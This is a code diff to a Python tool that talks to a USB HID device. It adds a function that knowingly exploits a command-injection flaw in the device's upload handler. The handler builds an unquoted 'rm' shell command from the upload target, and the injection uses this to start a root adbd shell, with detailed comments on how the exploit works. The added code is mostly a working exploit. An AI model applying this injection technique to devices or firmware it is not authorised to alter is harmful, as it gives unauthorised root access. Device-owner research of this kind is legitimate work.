@@ -11,6 +11,7 @@ from typing import Callable
 
 from .commands import (
     NormalCommand,
+    build_adb_upload_command_target_request,
     build_boot_metadata_request,
     build_upgrade_request,
     build_upload_commit_request,
@@ -40,6 +41,7 @@ from .protocol import (
 
 ADB_STARTUP_PATH = "/etc/conf.d/system.sh"
 ADB_STARTUP_CONTENT = b"/bin/adbd &"
+ADB_UPLOAD_COMMAND_CONTENT = b"\n"
 NORMAL_UPLOAD_CHUNK_SIZE = NORMAL_REPORT_SIZE - 14
 NORMAL_UPLOAD_CAPACITY = 0x01000200
 
@@ -168,6 +170,47 @@ def install_adb_startup() -> None:
     """Install the exact boot hook that starts the existing root ``adbd``."""
 
     upload_normal_file(ADB_STARTUP_PATH, ADB_STARTUP_CONTENT)
+
+
+def start_adb_through_upload_command() -> None:
+    """Start stock ``/bin/adbd`` once through the upload target vulnerability.
+
+    This path intentionally does *not* call :func:`upload_normal_file`, whose
+    ordinary destination validator must continue to reject metacharacters.  It
+    sends the same four uploader states, but uses the immutable target built by
+    ``build_adb_upload_command_target_request()``.
+
+    The final 0x3300 handler first interpolates the target into an unquoted
+    ``rm`` shell command, which launches ``/bin/adbd`` in the background.  Its
+    subsequent literal fopen is expected to fail because the target contains
+    an impossible tmpfs directory component.  A status-1 reply, read timeout,
+    or HID disconnect is therefore expected *only after the commit report has
+    been written*.  The caller must determine success by waiting for ADB.
+
+    Earlier initialize, target, and final-data exchanges remain strict: if any
+    of them fails, the commit is never sent and this function raises.
+    """
+
+    initialize_request = build_upload_initialize_request()
+    target_request = build_adb_upload_command_target_request()
+    final_data_request = build_upload_data_request(
+        0,
+        ADB_UPLOAD_COMMAND_CONTENT,
+        final=True,
+    )
+    commit_request = build_upload_commit_request()
+
+    with HidHandle(NORMAL_VID, NORMAL_PID) as handle:
+        exchange_normal(handle, initialize_request)
+        exchange_normal(handle, target_request)
+        exchange_normal(handle, final_data_request)
+        try:
+            exchange_normal(handle, commit_request)
+        except (ProtocolError, OSError):
+            # The command has already been written.  The analyzed implementation
+            # starts adbd before its deliberately failing fopen and status reply;
+            # USB reconfiguration may also remove HID before a reply is readable.
+            return
 
 
 def enter_bootloader() -> None:
